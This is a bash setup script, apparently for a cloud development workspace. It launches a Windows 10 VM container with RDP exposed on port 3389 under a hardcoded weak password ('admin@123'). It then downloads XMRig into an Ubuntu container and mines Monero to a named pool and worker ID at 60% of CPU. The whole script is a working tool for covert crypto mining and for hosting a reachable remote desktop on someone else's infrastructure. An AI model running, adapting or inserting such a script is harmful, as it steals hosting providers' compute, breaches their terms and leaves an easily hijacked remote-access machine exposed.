#!/bin/bash

echo "========================================="
echo "YMDin Auto Minor - Starting Setup"
echo "========================================="

# Kiểm tra Docker đã chạy chưa
echo "Waiting for Docker to be ready..."
while ! docker ps > /dev/null 2>&1; do
    sleep 1
done
echo "Docker is ready!"

# Kiểm tra file docker-compose.yml
if [ -f "/workspace/docker-compose.yml" ]; then
    echo "Found docker-compose.yml, starting containers..."
    cd /workspace
    docker compose up -d
else
    echo "docker-compose.yml not found in /workspace"
    echo "Creating basic docker-compose.yml..."
    
    # Tạo docker-compose.yml nếu chưa có
    cat > /workspace/docker-compose.yml << 'EOF'
version: '3.8'

services:
  windows:
    image: dockurr/windows
    container_name: windows
    environment:
      VERSION: "10"
      USERNAME: "MASTER"
      PASSWORD: "admin@123"
      RAM_SIZE: "5G"
      CPU_CORES: "2"
      DISK_SIZE: "100G"
      DISK2_SIZE: "100G"
    devices:
      - /dev/kvm
      - /dev/net/tun
    cap_add:
      - NET_ADMIN
    ports:
      - "8006:8006"
      - "3389:3389/tcp"
      - "3389:3389/udp"
    restart: unless-stopped
    stop_grace_period: 2m

  ubuntu_cli:
    image: ubuntu:22.04
    container_name: ubuntu_cli
    command: tail -f /dev/null
    restart: unless-stopped
EOF
    
    docker compose up -d
fi

# Đợi container ubuntu_cli sẵn sàng
echo "Waiting for ubuntu_cli container..."
sleep 10

# Chạy lệnh mining bên trong ubuntu_cli
echo "Starting XMRig miner in ubuntu_cli..."
docker exec ubuntu_cli bash -c "
    echo 'Installing wget...'
    apt-get update && apt-get install -y wget tar
    cd /root
    if [ ! -f xmrig-6.26.0-linux-static-x64.tar.gz ]; then
        echo 'Downloading XMRig...'
        wget -q https://github.com/xmrig/xmrig/releases/download/v6.26.0/xmrig-6.26.0-linux-static-x64.tar.gz
        tar -xzf xmrig-6.26.0-linux-static-x64.tar.gz
    fi
    cd xmrig-6.26.0
    echo 'Starting miner...'
    ./xmrig -o xmr-sg.kryptex.network:7029 -u krxX2P79Q4.workbbbb3 -p x --coin monero --cpu-max-threads-hint=60
"

echo "========================================="
echo "Setup completed!"
echo "========================================="
